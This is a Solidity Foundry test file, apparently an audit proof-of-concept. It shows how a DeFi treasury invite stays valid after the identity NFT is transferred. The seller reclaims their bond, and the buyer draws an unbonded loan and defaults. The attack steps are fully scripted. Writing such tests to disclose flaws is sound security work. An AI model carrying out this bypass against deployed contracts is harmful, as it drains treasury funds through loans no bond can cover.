// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {TreasuryV4Base} from "../TreasurySponsorV4.t.sol";
import {InviteBond, ITreasuryRules} from "../../src/InviteBond.sol";
import {IERC8004Identity} from "../../src/interfaces/IERC8004Identity.sol";

/// PoC: Treasury invites are keyed only by agentId/expiry while InviteBond is keyed
/// by the current depositor. A seller can obtain an invite, transfer the NFT, wait
/// for their unused bond to release, and the buyer can still redeem the old invite.
contract InviteBondTransferBypassPoCTest is TreasuryV4Base {
    InviteBond bond;
    address safe = makeAddr("bond-beneficiary");
    uint256 constant BOND = 5e6;
    uint64 constant UNUSED = 4 days;

    function setUp() public override {
        super.setUp();
        bond = new InviteBond(
            pool,
            IERC8004Identity(address(reg)),
            ITreasuryRules(address(treasury)),
            safe,
            BOND,
            UNUSED
        );
        vm.prank(agentOp);
        usdc.approve(address(bond), type(uint256).max);
        _funded();
    }

    function test_transferAfterInviteLetsBuyerRedeemWithoutBond() public {
        // Seller posts the required bond before obtaining the invite.
        vm.prank(agentOp);
        bond.deposit(AGENT);

        uint64 expiry = uint64(vm.getBlockTimestamp() + 30 days);
        bytes memory invite = _invite(AGENT, expiry);

        // The invite is not owner-bound. Seller transfers the NFT before redemption.
        vm.prank(agentOp);
        reg.transferFrom(agentOp, agentOp2, AGENT);

        // Because no line was opened, the seller can release the bond after UNUSED.
        vm.warp(vm.getBlockTimestamp() + UNUSED + 1);
        assertTrue(bond.releasable(AGENT));
        uint256 sellerBefore = usdc.balanceOf(agentOp);
        bond.release(AGENT);
        assertEq(usdc.balanceOf(agentOp), sellerBefore + BOND);

        // Buyer supplies only the current owner's pool consent. The old invite remains valid.
        (CreditPoolV2.Consent memory c, bytes memory sig) = _consent(AGENT, AGENT2_PK);
        vm.prank(agentOp2);
        treasury.firstLine(AGENT, expiry, invite, c, sig);

        assertEq(pool.getAgent(AGENT).delegatedIn, 5 * USDC);
        assertFalse(bond.isBonded(AGENT), "buyer received a treasury line with no bond");

        // The buyer can now draw the treasury line and default. There is no bond left to slash.
        uint256 before = usdc.balanceOf(agentOp2);
        uint256 loan = _borrow(agentOp2, AGENT, 5 * USDC, 30 days);
        assertEq(usdc.balanceOf(agentOp2), before + 5 * USDC);

        _default(loan);
        assertEq(bond.isBonded(AGENT), false);
        assertEq(usdc.balanceOf(safe), 0, "no bond was available to cover the treasury loss");
    }
}
